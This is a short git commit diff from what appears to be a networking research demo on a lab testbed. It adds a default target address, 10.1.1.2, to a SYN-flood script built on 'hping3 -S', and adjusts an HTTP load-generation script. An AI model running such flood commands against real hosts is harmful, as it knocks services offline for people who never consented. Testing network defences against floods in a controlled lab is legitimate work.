ea5f908f97668d76c851c0b7d38a2c7c0b4f1044
slab <slab@node-0.met-demo.psi-pg0.wisc.cloudlab.us>
2018-08-03 15:56:35 -0500

    adding tools

--- HotNets_Demos/DoS_SYN_flood.sh
+++ HotNets_Demos/DoS_SYN_flood.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
 
 IP=$1
+if [ -z $IP ]; then
+    IP="10.1.1.2"
+fi
 
 sudo hping3 -i u50 -S $IP
--- HotNets_Demos/regular_http.sh
+++ HotNets_Demos/regular_http.sh
@@ -2,7 +2,7 @@
 
 IP=$1
 if [ -z $IP ]; then
-    $IP=10.1.1.2
+    IP="10.1.1.2"
 fi
 
-httping -i 0.00001 -G -c 10000 $IP:8000 
+httping -i 0.1 -G -c 15000 $IP:8000 
